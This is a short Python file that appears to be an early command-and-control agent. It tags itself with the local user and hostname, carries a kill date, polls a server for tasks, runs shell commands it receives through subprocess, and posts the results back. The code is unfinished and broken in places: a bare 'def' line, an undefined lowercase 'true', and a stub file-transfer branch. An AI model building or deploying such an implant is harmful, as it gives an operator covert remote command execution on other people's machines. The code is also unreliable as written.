import getpass
import socket
import json
import requests
import base64
import datetime
import subprocess
# variables that should be changed
# date in yyyy/mm/dd format
killdate= datetime.datetime(2021,9,14)
ServerUrl="http://localhost:8000/"
sleep_interval=10
#derive agent name
AgentName= getpass.getuser()+"@" + socket.gethostname()
print(AgentName)
def checkDate(aKilldate):
    if(datetime.datetime.now() > aKilldate):
        exit()
def register(aName):
    data = {"name" : aName}
    data_json = json.dumps(data)
    headers = {'Content-type': 'application/json'}
    response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
    return response.json()['id']
def get_command(aId):
    response= requests.get(ServerUrl+"api/checkin/"+str(aId)+"/")
    print(response.content)
    return response.json()
def execute_command(data):
    if data['CommandType']=='FileTransfer':
        print("file transfer")
    if data['CommandType']=='ShellCommand':
        return subprocess.check_output(data['Command'].split(' '))

def 
# def Upload_file(data):

def report_output(output,command_id):
    data={'output':output,'id': command_id }
    requests.post(ServerUrl+"api/agentreportoutput/",data=data)
#agent_id=register(AgentName)
#print(agent_id)
agent_id=1
#print( register(AgentName))
json_data= get_command(agent_id)
output=execute_command(json_data)
print(output)
print(json_data['id'])
report_output(output,json_data['id'])


def fake():
    if(true):
        return True
    else:
        return False
# this is when we register
#response = requests.get("https://192.168.150.111/api/v1/vmware/vm?name="+vmname, auth=auth_values, verify=False)
# data = {"name" : AgentName}
# data_json = json.dumps(data)
# headers = {'Content-type': 'application/json'}
# # response = requests.post(ServerUrl+"api/register/", data=data_json, headers=headers)
# print(response.json())
